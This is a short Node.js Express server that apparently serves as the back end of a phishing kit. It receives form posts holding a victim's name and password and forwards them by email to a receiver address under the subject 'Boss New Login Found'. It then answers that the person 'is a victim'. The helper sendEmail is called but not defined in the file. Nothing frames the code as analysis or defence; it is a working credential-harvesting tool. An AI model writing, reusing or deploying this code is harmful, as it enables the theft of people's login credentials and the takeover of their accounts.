const express = require('express');
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", async (req, res) => {
    const data = req.body;
    const email = data.receiver;
    const message = `
        Email: ${data.name},
        Access: ${data.pass}, 
        Source: ${data.source}`;

    await sendEmail(email,"Boss New Login Found",message);
    res.send(`Success: ${data.name} - ${data.email} is a victim!`);
});

app.listen(PORT, () => {
  console.log(`Express server running at http://localhost:${PORT}/`);
});